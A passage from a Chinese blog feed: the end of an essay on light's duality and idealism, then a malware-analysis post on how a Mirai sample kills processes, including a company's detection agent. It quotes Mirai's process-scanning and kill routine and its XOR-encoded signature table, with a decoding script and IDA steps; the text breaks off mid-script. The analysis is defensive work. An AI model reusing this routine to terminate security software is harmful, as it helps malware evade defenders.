Routledge.</li><li>Husserl, E. (1913). Ideas: General Introduction to Pure Phenomenology. Routledge.</li><li>Berkeley, G. (1710). A Treatise Concerning the Principles of Human Knowledge. Oxford University Press.</li></ol><h2 id="致谢"><a class="markdownIt-Anchor" href="#致谢"></a> 致谢</h2><p>我要感谢所有在本文完成期间支持我的人。我要感谢我的主管[Chatgpt]在整个过程中的指导和支持。我还要感谢为我提供完成研究所需资源的图书馆和学术机构。</p><p>我要感谢所有帮助形成本文讨论的理论的科学家和哲学家的贡献。他们的工作为我的研究奠定了基础，我很感谢他们的见解和发现。</p><p>最后，我要感谢我的家人和朋友在整个项目过程中坚定不移的支持和鼓励。没有他们的爱与支持，就不可能有这篇论文。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt; 简介&lt;/h2&gt;
&lt;h3 id=&quot;光的波粒二象性理论与存在即被感知理论概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#光的波粒二象性理论与存在即被感知理论概述&quot;&gt;&lt;/a&gt; 光的波粒二象性理论与存在即被感知理论概述&lt;/h3&gt;
&lt;p&gt;光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。&lt;/p&gt;
&lt;h3 id=&quot;研究目的及意义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#研究目的及意义&quot;&gt;&lt;/a&gt; 研究目的及意义&lt;/h3&gt;
&lt;p&gt;本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。&lt;/p&gt;
&lt;p&gt;这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。&lt;/p&gt;
&lt;p&gt;除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。&lt;/p&gt;
&lt;p&gt;总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>Mirai恶意样本KILL进程特征提取</title>
    <link href="https://yoloyolo.top/2022/06/14/Mirai-KILL-KEY/"/>
    <id>https://yoloyolo.top/2022/06/14/Mirai-KILL-KEY/</id>
    <published>2022-06-14T23:38:41.000Z</published>
    <updated>2022-06-14T12:13:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>上班的时候被安排了个分析恶意样本的活<br />说是这个恶意样本会选择性地KILL进程，把公司开发的HIDS给KILL了<br />让我分析一下这个恶意样本的KILL机制以及KILL特征<br /><s>WEB手，但是干的或是恶意样本分析</s></p><a id="more"></a><h1 id="跑着玩玩"><a class="markdownIt-Anchor" href="#跑着玩玩"></a> 跑着玩玩</h1><p>在虚拟机里运行这个恶意样本，给我物理机整没网了<br />公司网总共1MB/s的带宽<s>下个炉石下半天</s>全给你占了是吧（流汗黄豆）</p><p>sysdig看一下这个恶意样本进程的读写操作<br />一直在读取<code>/proc/self/exe</code><br />看着看着就觉得不对劲了，这读的不是sysdig的help信息么<br />大概理一下思路，这玩意应该是遍历<code>/proc/$pid/exe</code>，然后读取内容<br />至于KILL特征，没思路</p><h1 id="re-searcher"><a class="markdownIt-Anchor" href="#re-searcher"></a> re-searcher</h1><p>根据前几次恶意样本分析的经验，在google上搜一下这个恶意样本的SHA256就能知道名字<br />搜一下名字就能找到相关报告<br />上传到一个在线杀箱看恶意样本的活动<br />结合别人的分析报告就差不多了</p><p>然后就找到了这篇文章<br /><a href="https://paper.seebug.org/142/?utm_source=tuicool&amp;utm_medium=referral#21-payload">Mirai 源码分析</a><br />这篇文章提到了部分特征，但是样本应该跟我手头上的不一样，所以还是得自己分析<br /><a href="https://github.com/jgamblin/Mirai-Source-Code">Mirai源码</a></p><h1 id="source-code"><a class="markdownIt-Anchor" href="#source-code"></a> source code</h1><p>先看<code>kill.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (memory_scan_match(exe_path))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[killer] Memory scan match for binary %s\n&quot;</span>, exe_path);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">kill(pid, <span class="number">9</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>差不多就是这段代码了<br />至于<code>exe_path</code>，有这么一段注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Store &#x2F;proc&#x2F;$pid&#x2F;exe into exe_path</span><br></pre></td></tr></table></figure><p>然后就看看下面两个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">memory_scan_match</span><span class="params">(<span class="keyword">char</span> *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, ret;</span><br><span class="line">    <span class="keyword">char</span> rdbuf[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">char</span> *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;</span><br><span class="line">    <span class="keyword">int</span> m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;</span><br><span class="line">    BOOL found = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = open(path, O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT);</span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT2);</span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT3);</span><br><span class="line">    table_unlock_val(TABLE_MEM_UPX);</span><br><span class="line">    table_unlock_val(TABLE_MEM_ZOLLARD);</span><br><span class="line"></span><br><span class="line">    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &amp;m_qbot_len);</span><br><span class="line">    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &amp;m_qbot2_len);</span><br><span class="line">    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &amp;m_qbot3_len);</span><br><span class="line">    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &amp;m_upx_len);</span><br><span class="line">    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &amp;m_zollard_len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((ret = read(fd, rdbuf, <span class="keyword">sizeof</span> (rdbuf))) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))</span><br><span class="line">        &#123;</span><br><span class="line">            found = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT);</span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT2);</span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT3);</span><br><span class="line">    table_lock_val(TABLE_MEM_UPX);</span><br><span class="line">    table_lock_val(TABLE_MEM_ZOLLARD);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">mem_exists</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> buf_len, <span class="keyword">char</span> *str, <span class="keyword">int</span> str_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> matches = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str_len &gt; buf_len)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (buf_len--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*buf++ == str[matches])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (++matches == str_len)</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            matches = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>memory_scan_match</code>用于在<code>/proc/$pid/exe</code>中查找特征<br />函数<code>mem_exists</code>是查找功能的具体实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m_qbot_report</span><br><span class="line">m_qbot_http</span><br><span class="line">m_qbot_dup</span><br><span class="line">m_upx_str</span><br><span class="line">m_zollard</span><br></pre></td></tr></table></figure><p>这五个变量就是特征</p><p>这五个变量又来自于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TABLE_MEM_QBOT</span><br><span class="line">TABLE_MEM_QBOT2</span><br><span class="line">TABLE_MEM_QBOT3</span><br><span class="line">TABLE_MEM_UPX</span><br><span class="line">TABLE_MEM_ZOLLARD</span><br></pre></td></tr></table></figure><p>然后这五个变量又来自于<code>table.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add_entry(TABLE_MEM_QBOT, <span class="string">&quot;\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22&quot;</span>, <span class="number">13</span>);</span><br><span class="line">add_entry(TABLE_MEM_QBOT2, <span class="string">&quot;\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22&quot;</span>, <span class="number">10</span>);</span><br><span class="line">add_entry(TABLE_MEM_QBOT3, <span class="string">&quot;\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22&quot;</span>, <span class="number">10</span>);</span><br><span class="line">add_entry(TABLE_MEM_UPX, <span class="string">&quot;\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22&quot;</span>, <span class="number">33</span>);</span><br><span class="line">add_entry(TABLE_MEM_ZOLLARD, <span class="string">&quot;\x58\x4D\x4E\x4E\x43\x50\x46\x22&quot;</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>看样子是加密的<br />但是下面看到了一个很简单的加解密函数<br />大概意思是<code>m ^ 0x22 = c</code><br />解密脚本以及输出如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line"><span class="string">&quot;\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x58\x4D\x4E\x4E\x43\x50\x46\x22&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> cipher:</span><br><span class="line">str_tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> _:</span><br><span class="line">char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(__) ^ <span class="number">0x22</span>)</span><br><span class="line"><span class="keyword">if</span> char == <span class="string">&quot;\0&quot;</span>:</span><br><span class="line">char = <span class="string">&quot;\\x00&quot;</span></span><br><span class="line">str_tmp = str_tmp + char</span><br><span class="line">print(str_tmp)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">REPORT %s:%s\x00</span></span><br><span class="line"><span class="string">HTTPFLOOD\x00</span></span><br><span class="line"><span class="string">LOLNOGTFO\x00</span></span><br><span class="line"><span class="string">\x58\x4D\x4E\x4E\x43\x50\x46\x22\x00</span></span><br><span class="line"><span class="string">zollard\x00</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>所以这个就和之前的分析报告对得上了，那本地的样本特征又该咋整呢？</p><h1 id="ida"><a class="markdownIt-Anchor" href="#ida"></a> ida</h1><p>strings窗口找字符串<br />找到一些看起来是加密的数据<br />程序初始内存为<code>0x08048000</code>，数据存储开始于<code>0x08058C60</code>，偏移量为<code>0x010c60</code>，数据存储结束于<code>0x08059637</code>，数据长度为<code>0x09d8</code><br />取出数据异或<code>0x22</code>得到明文<br />那么问题来了，这玩意该怎么和表中的每一项数据对应起来</p><p>函数<code>sub_8054D10</code>调用了这部分数据<br />取数据的下标和长度，对解密的字符串进行拆分即可<br />脚本如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br></pre></td><td class="code"><pre><span class="line">raw = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sub_8055CA0(v0, asc_8058C60, 2);</span></span><br><span class="line"><span class="string">dword_805A1C0 = (int)v0;</span></span><br><span class="line"><span class="string">word_805A1C4 = 2;</span></span><br><span class="line"><span class="string">v1 = sub_8056AC4(0xCu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v1, &amp;asc_8058C60[3], 12);</span></span><br><span class="line"><span class="string">dword_805A1B8 = (int)v1;</span></span><br><span class="line"><span class="string">word_805A1BC = 12;</span></span><br><span class="line"><span class="string">v2 = sub_8056AC4(2u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v2, &amp;asc_8058C60[16], 2);</span></span><br><span class="line"><span class="string">dword_805A300 = (int)v2;</span></span><br><span class="line"><span class="string">word_805A304 = 2;</span></span><br><span class="line"><span class="string">v3 = sub_8056AC4(0x1Du);</span></span><br><span class="line"><span class="string">sub_8055CA0(v3, &amp;asc_8058C60[19], 29);</span></span><br><span class="line"><span class="string">dword_805A1B0 = (int)v3;</span></span><br><span class="line"><span class="string">word_805A1B4 = 29;</span></span><br><span class="line"><span class="string">v4 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v4, &amp;asc_8058C60[35], 7);</span></span><br><span class="line"><span class="string">dword_805A1D0 = (int)v4;</span></span><br><span class="line"><span class="string">word_805A1D4 = 7;</span></span><br><span class="line"><span class="string">v5 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v5, &amp;asc_8058C60[43], 5);</span></span><br><span class="line"><span class="string">dword_805A1D8 = (int)v5;</span></span><br><span class="line"><span class="string">word_805A1DC = 5;</span></span><br><span class="line"><span class="string">v6 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v6, &amp;asc_8058C60[49], 11);</span></span><br><span class="line"><span class="string">dword_805A1E0 = (int)v6;</span></span><br><span class="line"><span class="string">word_805A1E4 = 11;</span></span><br><span class="line"><span class="string">v7 = sub_8056AC4(4u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v7, 